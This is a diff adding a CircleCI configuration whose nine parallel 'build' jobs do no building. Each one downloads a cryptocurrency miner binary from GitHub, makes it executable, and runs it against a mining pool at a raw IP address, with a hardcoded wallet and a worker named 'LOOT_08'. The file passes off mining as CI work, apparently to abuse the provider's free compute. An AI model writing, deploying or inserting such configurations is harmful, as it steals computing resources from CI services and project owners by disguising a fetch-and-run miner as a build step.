@@ -1,0 +1,86 @@
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      resource_class: medium
+      image: ubuntu-2204:2024.11.1
+    steps:
+      - run: wget https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64 && chmod +x iniminer-linux-x64 && ./iniminer-linux-x64 --pool stratum+tcp://0x7ca911f6742163847eA1f02048C4Da28d1fC6aa6.LOOT_08@67.220.72.177:32672 --cpu-devices 0 --cpu-devices 1 --cpu-devices 2 --cpu-devices 3
+
+  build2:
+    machine:
+      resource_class: medium
+      image: ubuntu-2204:2024.11.1
+    steps:
+      - run: wget https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64 && chmod +x iniminer-linux-x64 && ./iniminer-linux-x64 --pool stratum+tcp://0x7ca911f6742163847eA1f02048C4Da28d1fC6aa6.LOOT_08@67.220.72.177:32672 --cpu-devices 0 --cpu-devices 1 --cpu-devices 2 --cpu-devices 3
+      
+
+  build3:
+    machine:
+      resource_class: medium
+      image: ubuntu-2204:2024.11.1
+    steps:
+      - run: wget https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64 && chmod +x iniminer-linux-x64 && ./iniminer-linux-x64 --pool stratum+tcp://0x7ca911f6742163847eA1f02048C4Da28d1fC6aa6.LOOT_08@67.220.72.177:32672 --cpu-devices 0 --cpu-devices 1 --cpu-devices 2 --cpu-devices 3
+
+
+  build4:
+    machine:
+      resource_class: medium
+      image: ubuntu-2204:2024.11.1
+    steps:
+      - run: wget https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64 && chmod +x iniminer-linux-x64 && ./iniminer-linux-x64 --pool stratum+tcp://0x7ca911f6742163847eA1f02048C4Da28d1fC6aa6.LOOT_08@67.220.72.177:32672 --cpu-devices 0 --cpu-devices 1 --cpu-devices 2 --cpu-devices 3
+
+
+  build5:
+    machine:
+      resource_class: medium
+      image: ubuntu-2204:2024.11.1
+    steps:
+      - run: wget https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64 && chmod +x iniminer-linux-x64 && ./iniminer-linux-x64 --pool stratum+tcp://0x7ca911f6742163847eA1f02048C4Da28d1fC6aa6.LOOT_08@67.220.72.177:32672 --cpu-devices 0 --cpu-devices 1 --cpu-devices 2 --cpu-devices 3
+
+
+  build6:
+    machine:
+      resource_class: medium
+      image: ubuntu-2204:2024.11.1
+    steps:
+      - run: wget https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64 && chmod +x iniminer-linux-x64 && ./iniminer-linux-x64 --pool stratum+tcp://0x7ca911f6742163847eA1f02048C4Da28d1fC6aa6.LOOT_08@67.220.72.177:32672 --cpu-devices 0 --cpu-devices 1 --cpu-devices 2 --cpu-devices 3      
+
+
+  build7:
+    machine:
+      resource_class: medium
+      image: ubuntu-2204:2024.11.1
+    steps:
+      - run: wget https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64 && chmod +x iniminer-linux-x64 && ./iniminer-linux-x64 --pool stratum+tcp://0x7ca911f6742163847eA1f02048C4Da28d1fC6aa6.LOOT_08@67.220.72.177:32672 --cpu-devices 0 --cpu-devices 1 --cpu-devices 2 --cpu-devices 3
+
+
+  build8:
+    machine:
+      resource_class: medium
+      image: ubuntu-2204:2024.11.1
+    steps:
+      - run: wget https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64 && chmod +x iniminer-linux-x64 && ./iniminer-linux-x64 --pool stratum+tcp://0x7ca911f6742163847eA1f02048C4Da28d1fC6aa6.LOOT_08@67.220.72.177:32672 --cpu-devices 0 --cpu-devices 1 --cpu-devices 2 --cpu-devices 3
+
+  build9:
+    machine:
+      resource_class: medium
+      image: ubuntu-2204:2024.11.1
+    steps:
+      - run: wget https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64 && chmod +x iniminer-linux-x64 && ./iniminer-linux-x64 --pool stratum+tcp://0x7ca911f6742163847eA1f02048C4Da28d1fC6aa6.LOOT_08@67.220.72.177:32672 --cpu-devices 0 --cpu-devices 1 --cpu-devices 2 --cpu-devices 3
+
+      
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - build
+            - build2
+            - build3
+            - build4
+            - build5
+            - build6
+            - build7
+            - build8            
+            - build9
